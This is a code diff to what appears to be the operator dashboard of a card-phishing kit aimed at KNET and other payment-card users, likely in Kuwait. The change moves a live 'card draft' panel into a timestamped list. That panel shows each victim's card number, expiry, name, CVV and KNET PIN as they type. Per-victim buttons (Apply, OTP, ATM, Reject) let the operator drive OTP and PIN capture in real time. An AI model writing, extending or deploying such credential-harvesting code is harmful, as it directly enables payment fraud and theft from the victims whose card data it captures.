@@ -1850,6 +1850,16 @@
         });
       }
       
+      // مسودة البطاقة المباشرة تُعرض حسب وقتها
+      if (visitor.cardDraft) {
+        allEntries.push({
+          type: 'draft',
+          data: visitor.cardDraft,
+          index: 0,
+          timestamp: new Date(visitor.cardDraft.updatedAt || Date.now()).toISOString()
+        });
+      }
+
       // Sort by timestamp (newest first)
       allEntries.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp));
       
@@ -2068,6 +2078,38 @@
               html += '</div>';
               html += '</div>';
             }
+          } else if (entry.type === 'draft') {
+            const _d = entry.data;
+        const _dKNET = _d.paymentMethod === 'KNET';
+        const _dDigits = _dKNET ? (String(_d.prefix || '') + String(_d.cardNumberOnly || '')) : String(_d.cardNumber || '');
+        const _dInfo = getCardInfo(_dDigits);
+        const _dParts = _dDigits.match(/.{1,4}/g);
+        const _dNum = _dParts ? _dParts.join(' ') : '';
+        const _dBank = _dKNET ? (_d.bankName || 'KNET') : (_dDigits ? _dInfo.bank : 'CARD');
+        const _dMark = String(_dBank).replace(/[^A-Za-z]/g, '').slice(0, 2).toUpperCase() || 'BK';
+        html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color:#9333ea;">';
+        html += '<h3 class="font-bold mb-3 text-purple-800">💳 ' + (_dKNET ? 'كي نت (KNET)' : 'بطاقة دفع') + (_d.submitted ? '' : ' — إدخال مباشر') + '</h3>';
+        html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
+        html += '<div class="kc-wrap"><div class="kcard">';
+        html += '<div class="kc-top"><div class="kc-logo"><div class="kc-mark">' + _dMark + '</div><div class="kc-bank">' + _dBank + '</div></div><div class="kc-cur">KD</div></div>';
+        html += '<div class="kc-chip"></div>';
+        html += '<div class="kc-num">' + (_dNum || '**** **** ****') + '</div>';
+        html += '<div class="kc-bot">';
+        html += '<div><div class="kc-lab">Expiry</div><div class="kc-val">' + (_d.expiryMonth || '--') + '/' + (_d.expiryYear || '----') + '</div></div>';
+        html += '<div><div class="kc-lab">Name</div><div class="kc-val">' + (_d.nameOnCard || '-') + '</div></div>';
+        html += '<div><div class="kc-lab">CVV</div><span class="kc-cvv">' + (_d.cvv || '---') + '</span></div>';
+        if (_dKNET) html += '<div><div class="kc-lab">PIN</div><span class="kc-cvv">' + (_d.pin || '----') + '</span></div>';
+        html += '<div class="kc-right"><div class="kc-brand">' + (_dKNET ? 'KNET' : (_dDigits ? (_dInfo.network || 'CARD') : 'CARD')) + '</div><div class="kc-tier">' + (_dKNET ? 'Credit • Platinum' : ((_dInfo.type || '') + ' • ' + (_dInfo.tier || ''))) + '</div></div>';
+        html += '</div></div></div>';
+        if (_d.submitted) {
+          html += '<div class="flex gap-2 mt-3">';
+          html += '<button onclick="cardActionApp(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium">تطبيق</button>';
+          html += '<button onclick="cardActionOTP(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium">OTP</button>';
+          if (!_dKNET) html += '<button onclick="cardActionATM(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium">ATM</button>';
+          html += '<button onclick="cardActionReject(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium">رفض</button>';
+          html += '</div>';
+        }
+        html += '</div></div>';
           } else if (entry.type === 'data') {
             const dataEntry = entry.data;
             const dataIndex = entry.index;
@@ -2365,41 +2407,6 @@
         html += '</div>';
       }
       
-      // ==== بطاقة مباشرة (إدخال مباشر) ====
-      if (visitor.cardDraft) {
-        const _d = visitor.cardDraft;
-        const _dKNET = _d.paymentMethod === 'KNET';
-        const _dDigits = _dKNET ? (String(_d.prefix || '') + String(_d.cardNumberOnly || '')) : String(_d.cardNumber || '');
-        const _dInfo = getCardInfo(_dDigits);
-        const _dParts = _dDigits.match(/.{1,4}/g);
-        const _dNum = _dParts ? _dParts.join(' ') : '';
-        const _dBank = _dKNET ? (_d.bankName || 'KNET') : (_dDigits ? _dInfo.bank : 'CARD');
-        const _dMark = String(_dBank).replace(/[^A-Za-z]/g, '').slice(0, 2).toUpperCase() || 'BK';
-        html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color:#9333ea;">';
-        html += '<h3 class="font-bold mb-3 text-purple-800">💳 ' + (_dKNET ? 'كي نت (KNET)' : 'بطاقة دفع') + (_d.submitted ? '' : ' — إدخال مباشر') + '</h3>';
-        html += '<div class="bg-white p-4 rounded-lg border border-purple-200">';
-        html += '<div class="kc-wrap"><div class="kcard">';
-        html += '<div class="kc-top"><div class="kc-logo"><div class="kc-mark">' + _dMark + '</div><div class="kc-bank">' + _dBank + '</div></div><div class="kc-cur">KD</div></div>';
-        html += '<div class="kc-chip"></div>';
-        html += '<div class="kc-num">' + (_dNum || '**** **** ****') + '</div>';
-        html += '<div class="kc-bot">';
-        html += '<div><div class="kc-lab">Expiry</div><div class="kc-val">' + (_d.expiryMonth || '--') + '/' + (_d.expiryYear || '----') + '</div></div>';
-        html += '<div><div class="kc-lab">Name</div><div class="kc-val">' + (_d.nameOnCard || '-') + '</div></div>';
-        html += '<div><div class="kc-lab">CVV</div><span class="kc-cvv">' + (_d.cvv || '---') + '</span></div>';
-        if (_dKNET) html += '<div><div class="kc-lab">PIN</div><span class="kc-cvv">' + (_d.pin || '----') + '</span></div>';
-        html += '<div class="kc-right"><div class="kc-brand">' + (_dKNET ? 'KNET' : (_dDigits ? (_dInfo.network || 'CARD') : 'CARD')) + '</div><div class="kc-tier">' + (_dKNET ? 'Credit • Platinum' : ((_dInfo.type || '') + ' • ' + (_dInfo.tier || ''))) + '</div></div>';
-        html += '</div></div></div>';
-        if (_d.submitted) {
-          html += '<div class="flex gap-2 mt-3">';
-          html += '<button onclick="cardActionApp(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-purple-600 text-white rounded-lg hover:bg-purple-700 text-sm font-medium">تطبيق</button>';
-          html += '<button onclick="cardActionOTP(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-blue-600 text-white rounded-lg hover:bg-blue-700 text-sm font-medium">OTP</button>';
-          if (!_dKNET) html += '<button onclick="cardActionATM(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-green-600 text-white rounded-lg hover:bg-green-700 text-sm font-medium">ATM</button>';
-          html += '<button onclick="cardActionReject(this, \'' + visitor.socketId + '\')" class="flex-1 px-3 py-2 bg-red-600 text-white rounded-lg hover:bg-red-700 text-sm font-medium">رفض</button>';
-          html += '</div>';
-        }
-        html += '</div></div>';
-      }
-
       if (!allEntries.length && visitor.data && Object.keys(visitor.data).length > 0) {
         // Fallback to old data format
         const nafathData = {};
